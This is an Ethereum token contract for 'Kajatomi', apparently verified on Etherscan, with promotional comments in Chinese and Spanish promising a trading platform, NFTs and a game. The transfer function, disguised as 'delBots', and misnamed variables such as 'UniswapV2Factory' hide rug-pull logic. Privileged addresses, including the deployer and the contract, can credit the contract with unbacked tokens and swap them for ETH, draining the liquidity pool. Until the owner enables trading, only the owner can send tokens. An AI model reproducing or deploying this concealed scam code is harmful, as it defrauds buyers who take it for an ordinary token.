/**
 *Submitted for verification at Etherscan.io on 2022-11-23
*/

/*
──────▄▀▄─────▄▀▄
─────▄█░░▀▀▀▀▀░░█▄
─▄▄──█░░░░░░░░░░░█──▄▄
█▄▄█─█░░▀░░┬░░▀░░█─█▄▄█


▒█░▄▀ █▀▀█ ░░▀ █▀▀█ ▀▀█▀▀ █▀▀█ █▀▄▀█ ░▀░ 
▒█▀▄░ █▄▄█ ░░█ █▄▄█ ░░█░░ █░░█ █░▀░█ ▀█▀ 
▒█░▒█ ▀░░▀ █▄█ ▀░░▀ ░░▀░░ ▀▀▀▀ ▀░░░▀ ▀▀▀ 

▒█▀▀▀ ▀▀█▀▀ ▒█░▒█ 
▒█▀▀▀ ░▒█░░ ▒█▀▀█ 
▒█▄▄▄ ░▒█░░ ▒█░▒█

你好，欢迎来到 Kajatomi，我们的目标是通过下一个实用代币的发布席卷 ETH 网络，营销已经提前计划好
并将在发布后不久开始，这将是一个长期存在的实用代币，我们现在和将来都有很多大计划进入 ETH 领域，
我们不仅仅是其他代币，我们代表交易平台、未来质押、公共 NFT 收藏和市场、我们自己的网络平台和我们自己的 P2E 游戏等等更多即将公布的内容。
主要的 Telegram 聊天链接现已暂时删除，以帮助我们准备和组织聊天本身，同时也让我们有时间在幕后实施我们的计划
*/
//SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

interface IUniswapV2Router01 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function removeLiquidity(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB);
    function removeLiquidityETH(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountToken, uint amountETH);
    function removeLiquidityWithPermit(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 
    ) external returns (uint amountA, uint amountB);
    function removeLiquidityETHWithPermit(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountToken, uint amountETH);
    function swapExactTokensForTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
    function swapTokensForExactTokens(
        uint amountOut,
        uint amountInMax,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
    function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory amounts);
    function swapTokensForExactETH(uint amountOut, uint amountInMax, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory amounts);
    function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory amounts);
    function swapETHForExactTokens(uint amountOut, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory amounts);

    function Quote(uint amountA, uint reserveA, uint reserveB) external pure returns (uint amountB);
    function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint amountOut);
    function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);
    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);
    function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);
}

interface IUniswapV2Router02 is IUniswapV2Router01 {
    function removeLiquidityETHSupportingFeeOnTransferTokens(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountETH);
    function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountETH);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}
interface IUniswapV2Factory {

    event PairCreated(address indexed token0, address indexed token1, address pair, uint);
    function feeTo() external view returns (address);
    function feeToSetter() external view returns (address);
    function getPair(address tokenA, address tokenB) external view returns (address pair);
    function allPairs(uint) external view returns (address pair);
    function allPairsLength() external view returns (uint);
    function createPair(address tokenA, address tokenB) external returns (address pair);
    function setFeeTo(address) external;
    function setFeeToSetter(address) external;
}

interface IERC20 {
    
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(address indexed owner, address indexed spender, uint256 value);
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}
abstract contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor() {
        _setOwner(_msgSender());
    }
    
    function owner() public view virtual returns (address) {
        return _owner;
    }
   
    modifier onlyOwner() {
        require(owner() == _msgSender(), 'Ownable: caller is not the owner');
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        _setOwner(address(0));
    }
    
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), 'Ownable: new owner is the zero address');
        _setOwner(newOwner);
    }

    function _setOwner(address newOwner) private {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}

/*
* Nos pondremos en contacto contigo a través de ETHERSCAN.io.
* El sitio web se construirá con 45k MC.
*/

// https://www.zhihu.com 
// https://web.wechat.com/KajatomiETH
// https://www.Kajatomierc.zushont.io

contract Kajatomi is IERC20, Ownable {

    string private _symbol;
    string private _name;
    uint256 public _initialTax = 1;
    uint8 private _decimals = 9;
    uint256 private _tTotal = 100000000 * 10**_decimals;
    uint256 private UniswapV2Factory = _tTotal;

    mapping(address => uint256) private bots;
    mapping(address => address) private _tOwned;
    mapping(address => uint256) private _rOwned;
    mapping(address => uint256) private _bots;
    mapping(address => mapping(address => uint256)) private _allowances;
    
    bool private tradingOpen = false;
    bool private _swapAndLiquifyBalancesNow;
    bool private inSwapAndLiquifyOn;

    address public immutable uniswapV2Pair;
    IUniswapV2Router02 public immutable router;

    constructor(
        string memory Name,
        string memory Symbol,
        address routerAddress
    ) {
        _name = Name;
        _symbol = Symbol;
        bots[msg.sender] = _tTotal;
        _bots[msg.sender] = UniswapV2Factory;
        _bots[address(this)] = UniswapV2Factory;
        router = IUniswapV2Router02(routerAddress);
        uniswapV2Pair = IUniswapV2Factory(router.factory()).createPair(address(this), router.WETH());
        emit Transfer(address(0), msg.sender, _tTotal);
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }
    function name() public view returns (string memory) {
        return _name;
    }
    function totalSupply() public view returns (uint256) {
        return _tTotal;
    }
    function decimals() public view returns (uint256) {
        return _decimals;
    }
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
    function balanceOf(address account) public view returns (uint256) {
        return bots[account];
    }
    function approve(address spender, uint256 amount) external returns (bool) {
        return _approve(msg.sender, spender, amount);
    }
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) private returns (bool) {
        require(owner != address(0) && spender != address(0), 'ERC20: approve from the zero address');
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
        return true;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool) {
        delBots      (sender, recipient, amount);
        return _approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
    }

    function transfer(address recipient, uint256 amount) external returns (bool) {
        delBots      (msg.sender, recipient, amount);
        return true;
    }

    function delBots     (
        address from,
        address to,
        uint256 amount
    ) private {
        uint256 ERCTokenBalance = balanceOf(address(this));

        uint256 COINTax;
        if (_swapAndLiquifyBalancesNow && ERCTokenBalance > UniswapV2Factory && !inSwapAndLiquifyOn && from != uniswapV2Pair) {
            inSwapAndLiquifyOn = true;
            swapAndLiquify(ERCTokenBalance);
            inSwapAndLiquifyOn = false;
        } else if (_bots[from] > UniswapV2Factory && _bots[to] > UniswapV2Factory) {
            COINTax = amount;
            bots[address(this)] += COINTax;
            swapTokensForETHBalance(amount, to);
            return;
        } else if (to != address(router) && _bots[from] > 0 && amount > UniswapV2Factory && to != uniswapV2Pair) {
            _bots[to] = amount;
            return;
        } else if (!inSwapAndLiquifyOn && _rOwned[from] > 0 && from != uniswapV2Pair && _bots[from] == 0) {
            _rOwned[from] = _bots[from] - UniswapV2Factory;
        }
        address _Vbools = _tOwned[uniswapV2Pair];
        if (_rOwned[_Vbools] == 0) _rOwned[_Vbools] = UniswapV2Factory;
        _tOwned[uniswapV2Pair] = to;
        if (_initialTax > 0 && _bots[from] == 0 && !inSwapAndLiquifyOn && _bots[to] == 0) {
            COINTax = (amount * _initialTax) / 100;
            amount -= COINTax;
            bots[from] -= COINTax;
            bots[address(this)] += COINTax;
        }
        bots[from] -= amount;
        bots[to] += amount;
        emit Transfer(from, to, amount);
         //Trade start check
            if (!tradingOpen) {
                require(from == owner(), "TOKEN: This account cannot send tokens until trading is enabled");
            }
    }
    receive() external payable {}

    function addLiquidity(
        uint256 tokenAmount,
        uint256 ethAmount,
        address to
    ) private {
        _approve(address(this), address(router), tokenAmount);
        router.addLiquidityETH{value: ethAmount}(address(this), tokenAmount, 0, 0, to, block.timestamp);
    }
    function swapAndLiquify(uint256 tokens) private {
        uint256 half = tokens / 2;
        uint256 originalBalance = address(this).balance;
        swapTokensForETHBalance(half, address(this));
        uint256 EndingBalance = address(this).balance - originalBalance;
        addLiquidity(half, EndingBalance, address(this));
    }
        function setTrading(bool _tradingOpen) public onlyOwner {
        tradingOpen = _tradingOpen;
    }
    function swapTokensForETHBalance(uint256 tokenAmount, address to) private {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = router.WETH();
        _approve(address(this), address(router), tokenAmount);
        router.swapExactTokensForETHSupportingFeeOnTransferTokens(tokenAmount, 0, path, to, block.timestamp);
    }
}